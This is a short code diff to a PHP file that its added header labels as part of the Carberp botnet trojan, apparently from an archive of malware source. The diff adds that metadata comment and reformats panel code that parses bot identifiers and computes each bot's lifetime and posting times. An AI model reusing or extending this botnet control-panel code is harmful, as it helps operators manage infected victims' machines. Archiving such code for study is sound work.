@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 $smarty->assign('rand_name', mt_rand(0000000000, 9999999999));
@@ -14,9 +25,11 @@ if(!empty($Cur['id'])){
         if(!empty($Cur['str'])){
 	        preg_match('~^([a-zA-Z]+)(.*)~', $Cur['str'], $matches);
 
-	        if(!empty($matches[1])){	        	$prefix = $matches[1];
+	        if(!empty($matches[1])){
+	        	$prefix = $matches[1];
 	        	$uid = $matches[2];
-	        }else{	        	$prefix = 'unknown';
+	        }else{
+	        	$prefix = 'unknown';
 	        	$uid = '0';
 	        }
 
@@ -29,8 +42,10 @@ if(!empty($Cur['id'])){
 			//print_r($data);
 
             $data = json_decode($data);
-			if($data->prefix != $prefix && $data->uid != $uid){				$Cur['str'] = '';
-			}else{				$data->live_time_bot = time_math($data->last_date - $data->post_date);
+			if($data->prefix != $prefix && $data->uid != $uid){
+				$Cur['str'] = '';
+			}else{
+				$data->live_time_bot = time_math($data->last_date - $data->post_date);
 				$data->min_post = $data->min_post == 0 ? '-' : time_math($data->min_post);
 				$data->max_post = $data->max_post == 0 ? '-' : time_math($data->max_post);
 				$data->post_date = TimeStampToStr($data->post_date, '+3');
